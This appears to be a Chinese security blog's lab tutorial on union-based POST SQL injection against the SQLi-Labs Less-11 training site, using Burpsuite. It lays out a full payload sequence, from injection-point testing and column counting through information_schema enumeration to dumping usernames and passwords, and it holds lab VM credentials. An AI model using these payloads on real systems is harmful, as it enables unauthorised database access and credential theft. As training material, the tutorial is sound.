---
title: SQL注入的方法0x001
url: https://mp.weixin.qq.com/s/szBoJ3IIWwBRJl8CjUNcWg
source: Doonsec's feed
date: 2026-05-17
fetch_date: 2026-05-18T06:10:14.775384
---

# SQL注入的方法0x001

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/QJTLZsy5trG4fu2l8kbuwtnecOobbHVImmJm08mQJldzg9LtN53WS6icttDKCvsGLYCh5HDQGqTdVAVZIDiaicrZ93jNicEVKTiazIHRsJvibU5CA/0?wx_fmt=jpeg)

# SQL注入的方法0x001

原创

建哥聊安全
建哥聊安全

建哥聊安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# **免责声明：****严格禁止**对任何未授权系统/网络进行扫描、攻击或入侵。 禁止制作/传播恶意程序，禁止参与任何网络犯罪。如擅自将本文实验技术用于非法用途，一切法律后果及责任由行为人独立承担，与作者无关。****

# **SQL注入-基于联合查询的POST注入**

## **实验目的**

理解POST注入的原理和特点，掌握利用联合查询（union select）的方法实现SQL注入的基本流程。

## **实验环境**

#### **攻击机：Pentest-Atk**

（1）操作系统：Windows 10

（2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等

（3）登录账号密码：操作系统账号Administrator，密码Sangfor!7890

#### **靶机：A-SQLi-Labs**

（1）操作系统：CentOS 7

（2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境

（3）登录账号密码：操作系统账号root，密码Sangfor!7890

## **实验原理**

POST注入，其注入点存在于POST表单中的参数处。攻击者可以通过代理抓包工具（如Burpsuite）拦截并修改POST表单中的参数，利用union select命令进行注入，暴露数据库中存储的信息。

## **实验步骤**

#### **本实验的目标是：以SQLi-Labs网站的Less-11为入口，利用联合查询（union select）的方式实施SQL注入，获取SQLi-Labs网站的登录用户名和密码。**

#### **1．访问SQLi-Labs网站**

在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-11。访问的URL为：

http://[靶机IP]/sqli-labs/Less-11/

(注意大小写)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trGgWsQOjs8EAKH0I6QmGfYwnopUwMJy9NwibQbsnbYHT5iadzkIxnD5QnwLzmqbMnDrhdOhUApMJot7pD7M9RWJg0nhM2BgLa52E/640?wx_fmt=png&from=appmsg)

#### **2．利用Burpsuite工具抓包**

（1）启动Burpsuite

在攻击机Pentest-Atk的桌面文件夹Burp中，鼠标左键双击BURP.cmd程序，启动Burpsuite。

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFA8tO4UZKSr4rGibKFpf78kLX4zibRq81Ln0yCDeDhNb1noaUnD4m65tiatAnf1BroKTLqMD01OVx3f7Cv8dzR5sSyl8oTwA9IGs/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trFjaWhHfJoa0l9YR5LVibCicvzjKHmicuSzMCPylnn5uVzpiaic00SeL8BIHZtiaPB2c6icSVvrTx9X1RWsdjmXgUvcicY35YoQ1p7Dt54/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trHSOfQqCXibMXGEWHyqdUS52GUcm14iaPdFLIX8ib6R4NAVszX0VPfM7NRuYDTNCjSXGMFuJZRwpUzPlglicibHd6zZ0dvoHdheNjlc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trHiazr39LGFbnDEpOzicAMppjo2eibeUFwf3z0HYysgUczy1cc4XGib4sPYnSGoglo4GOhQibPb8agnujukgepicnZrK89BT2CGnFU80/640?wx_fmt=png&from=appmsg)

（2）设置Burpsuite的代理服务端口

在Burpsuite软件界面上选择选项卡“Proxy”->“Options”，在Proxy Listeners模块下，将Burpsuite的代理服务端口设置为8080（此为Burpsuite默认的服务端口）。

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trHJTsUvas6HyDKOGSYBrm0fjvhmKic7ZAYsVPYNRw9JcGe2LoX7Gk3oWiaq6Skh8zcXHPWZJkv1FORESGIWf6Dpf4O5MqS3zzricU/640?wx_fmt=png&from=appmsg)

（3）开启Burpsuite的代理拦截功能

在Burpsuite软件界面上选择选项卡“Proxy”->“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trG4hEtJafJIGiarPeFBtYBoicvXgMscmIKqAricZwawdOfYNZHvoROuZscBhYC2YuLWEbJqpdvOM4LCKdjReEswGLLsJSULjdpk2c/640?wx_fmt=png&from=appmsg)

注意：上述设置完成之后，不要关闭Burpsuite！

（4）设置Firefox代理

回到FireFox浏览器界面，鼠标右键单击浏览器地址栏右方的FoxyProxy插件图标按钮，在弹出的菜单中选择“为全部URLs启用代理服务器127.0.0.1:8080”:

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFuTs6IMhUeq0nQ4icRPYdkvha9TWoVuaD7HpreIEWaer7H72qqbMx3nskIiaTGcaW20CibVjBwibHicB4UhibO8cChThkllAH3QwVaU/640?wx_fmt=png&from=appmsg)

代理设置成功后，FoxyProxy插件图标会变成蓝色。

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trGogcMibYnwrtt0ql6tgQAJtNDjdaPmUnMLQwBg9A3YQ5s9rYzbBCfuy1qCeahdQKBwSHoFkFcr5LMavibGyYUAAqNrDOTO4bCib0/640?wx_fmt=png&from=appmsg)

（5）利用Burpsuite工具拦截HTTP请求包

在FireFox浏览器访问的Less-11登录验证界面，输入用户名admin、
密码任意（本例中为1），然后点击Submit按钮，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trETadib1ItX0AeCMrVYKqMydFPZuSyxlh2CYanvW07xnPAEqb6BWExhsaYOKSibm0xjicK5Uoz8ofaqvMC1sickgFogFNbibtu866b0/640?wx_fmt=png&from=appmsg)

此时Burpsuite会拦截到HTTP请求包：

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFtgaA76ovhyMxldHJZyCbToUbNyBrb3bmjLFZ1EEyfsqx4mD0Ga1sRYIlfmJmhKLysVXNQywhTxoray75dibtslgdibePob3hOE/640?wx_fmt=png&from=appmsg)

（6）将Burpsuite工具拦截到的HTTP请求包发送至Repeater模块。

选中拦截到的HTTP请求包全部内容，单击鼠标右键，在弹出的菜单中选择“Send to Repeater”，将其发送给Burpsuite的Repeater模块。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trFpwH5obfs7EM7zTvafM8b3r7GSAEMF4taRPWXqzGLibMjOK2WR2BcT8G9EOiaL2s6icnGYEka4yN5VTFakNA4YtQOJNq3jW15XzY/640?wx_fmt=png&from=appmsg)

发送成功后，在Burpsuite的Repeater选项卡下能够看到刚刚拦截的HTTP请求包内容。

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trGicdAJq1de4vyiaXrOic0y7IPb6HvblbIZcqoNVQAcGzuDN3V77C4mIYjedmfTPrxUWNglmkXW5sIeNsicuSiad6NjUWGcIua9iaia14/640?wx_fmt=png&from=appmsg)

后续的步骤中，可以在Repeater选项卡下的Request栏中设置注入的payload，设置完成后点击Send按钮发送，并在Response栏中观察目标服务器的响应。

#### **3．寻找注入点**

在POST表单处，分别使用以下2条payload寻找注入点及判断注入点的类型：

uname=admin'&passwd=1&submit=Submit

报错！

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFNBbOw3vmoLfJb4WCdqP8uQvZ6zTb1nsser3x630ocib1ChvHSWBSzbbybx7bh1OMp7Ticdkk4wNBiaVDhIOeZx5WaRyqWuM2MkY/640?wx_fmt=png&from=appmsg)

uname=admin'#&passwd=1&submit=Submit

目标正常回显用户名和密码！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trFM5myCGEbytKXA5IrScSEKle2N46dJtWx0aBqTofNzRmlFycXdN1uNV8OLFZII0MdYr9e7AGnk6XpLPz0hO9KrGLicO5hmOQ4Y/640?wx_fmt=png&from=appmsg)

由此可以判断，目标网站在POST参数处存在字符型注入点。

#### **4．判断网站查询的字段数**

尝试使用以下payload获取网站查询的字段数（关键字order by）：

uname=admin' order by 1#&passwd=1&submit=Submit

目标正常回显用户名和密码！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trHQq80cZ5o192pkjwcjRicibSr9ib9uOMMZM47BhlmuwtQRwjqr7XIZnujV1G5dTsegcSMibkFiaoWibZH8KIKWvnvdSq3Lfib9LVpKhQ/640?wx_fmt=png&from=appmsg)

uname=admin' order by 2#&passwd=1&submit=Submit

目标正常回显用户名和密码！

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trEibPtyic4kej1yLdWiapI2qmRXh8ARm7FXkcrtr7vZ0X8vaQpkLI9nznTfpmM2Om8UoGg9iafEYicTQqBbbUB8cjoo4NNlczk1QwCs/640?wx_fmt=png&from=appmsg)

uname=admin' order by 3#&passwd=1&submit=Submit

报错！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trGpL4ZnxibmThVtf4eotB0LFkOfpeB5iatXDa3zpUMW98RUsmpryveLpoLLpnjbcqPNHfsX1p7ibibYt73yB1btStLH2nvlYEaPlKI/640?wx_fmt=png&from=appmsg)

由此可以判断，网站查询的字段数为2。

#### **5．判断网站的回显位置**

利用以下payload判断网站的回显位置：

uname=admin' and 1=2 union select 1,2#&passwd=1&submit=Submit

运行结果，1号位和2号位均可以回显！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trEd7cfYiaZiachVX91VvNuHqicRr9GP1xx2K9ZECM78DDKV1Uf32Sah5yEiaPicyia8Xx9z9g1HTTpxOk8BiauYYdJZH8pKEiaO4O9r1IA/640?wx_fmt=png&from=appmsg)

#### **6．获取网站当前所在数据库的库名**

利用以下payload获取网站当前所在数据库的库名：

uname=admin' and 1=2 union select 1,database()#&passwd=1&submit=Submit

显示结果为security。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trGKH9ovdDAt3l379FS6PsuAhL6xdNgZibfoW2jMa3xI9mmadqDiaCOZTIFBQib62Dy71qrJBxx1fv3NRJic17SqiaUn4HrQxRTNlzpw/640?wx_fmt=png&from=appmsg)

#### **7．获取数据库security的全部表名**

使用以下payload获取数据库security的全部表名：

uname=admin' and 1=2 union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema='security'#&passwd=1&submit=Submit

显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trGaiaFO2Oc42fBfYIIZpRp9QiarDfm8VIhXnTDBJ8NWJnSp0WfvmpOicQMCzepYRjbarutLySRpbXbicMBpiatKYTIH9tefqiafdnw5w/640?wx_fmt=png&from=appmsg)

#### **8．获取users表的全部字段名**

使用以下payload获取users表的全部字段名：

uname=admin' and 1=2 union select 1,group\_concat(column\_name) from information\_schema.columns where table\_schema='security' and table\_name='users'#&passwd=1&submit=Submit

显示结果，users表中有id、username和password三个字段。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trFpAo22ADgfJpSpc3Opdbiac38lb0dR8BUiaYQ73ibHjiaibrhBBhGap03orT4dKpTMb888aEDiciaIBPicVIKg5CI1iaBD0MMgPOsuiczq0/640?wx_fmt=png&from=appmsg)

#### **9．获取users表id、username和password字段的全部值。**

由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如

（1）显示第1组数据

uname=admin' and 1=2 union select 1,concat\_ws(',',id,username,password) from security.users limit 0,1#&passwd=1&submit=Submit

显示结果为Dump，Dump。

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trHufLib6bA3IibSGL2MViazNIiakexblK4iaMaLa4kBt8ZDEOo1M7a3V9icxyIyNboYjnZtibuHowmibhLuN1ZeQey3e0Z9t5pQSyqblpQ/640?wx_fmt=png&from=appmsg)

（2）显示第2组数据

uname=admin' and 1=2 union select 1,concat\_ws(',',id,username,password) from security.users limit 1,1#&passwd=1&submit=Submit

显示结果为Angelina，I-kill-you。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trGib79cax2HJwF4JRWfTOsEExIIFYYnQGaJs0r11aY2njHyl7miacyeiaQ8D2SVfxEPHEvKuOH6v9zCpmtQia7qbm4FAYIibB28QbSc/640?wx_fmt=png&from=appmsg)
...